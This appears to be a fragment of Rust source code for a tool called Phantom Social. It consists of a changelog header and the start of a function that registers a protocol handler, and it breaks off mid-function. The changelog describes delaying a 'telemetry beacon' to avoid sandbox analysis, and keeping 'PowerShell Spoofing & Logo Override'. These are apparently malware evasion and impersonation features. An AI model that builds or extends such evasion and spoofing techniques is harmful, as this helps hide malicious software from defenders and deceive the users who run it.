// ==========================================================================
// PHANTOM SOCIAL v3.9.2 - STEALTH TIMING UPDATE 🕒
// ==========================================================================
// ✅ FIXED: Telemetry beacon now waits 5+ minutes (avoids sandbox analysis)
// ✅ PRESERVED: Protocol Handler "Do Nothing" logic
// ✅ PRESERVED: PowerShell Spoofing & Logo Override
// ==========================================================================
...
fn register_protocol_handler() {
    if let Ok(exe) = std::env::current_exe() {
        // [FIXED] Pass the URL as an argument ("%1") so we can distinguish verify vs dismiss
